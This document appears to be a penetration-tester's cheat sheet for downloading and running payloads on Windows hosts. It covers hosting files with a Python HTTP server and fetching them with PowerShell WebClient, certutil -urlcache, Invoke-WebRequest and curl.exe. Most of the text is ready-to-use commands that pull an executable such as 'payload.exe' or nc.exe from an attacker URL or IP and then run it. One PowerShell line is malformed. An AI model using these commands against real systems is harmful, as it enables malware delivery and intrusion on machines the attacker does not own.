# Download to disk and execute
## deploy http server
```python
python -m SimpleHTTPServer 80 # python 2.x
python -m http.server 80 # python 3.x
```

## Net.WebClient DownloadFile method
noisy and not recommendad
```powershell
PS> $downloader = New-Object System.Net.WebClient
PS> $payload = "http://attacker_URL/payload.exe"
PS> $local_file = "C:\programdata\payload.exe"
PS> $downloader.DownloadFile $payload,$local_file)
PS> & $local_file # execute file
```
```powershell
PS> (new-object System.Net.WebClient).DownloadFile('http://<IP>:<PORT>/<file.exe>','<C:\Users\xxx\Desktop\file.exe>')
```
## BITSAdmin.exe
## Certutilexe w/ -urlcache argument
```powershell
cmd> certutil -urlcache -f http://<IP>:<PORT>/<file.exe> <file.exe> # cmd.exe
```

## other
```powershell
PS> IWR -Uri http://<IP>:<PORT>/<file.exe> -OutFile <C:\temp\nc.exe>
cmd>/PS> curl.exe 172.16.1.30/wget.exe -o C:\temp\wget.exe
```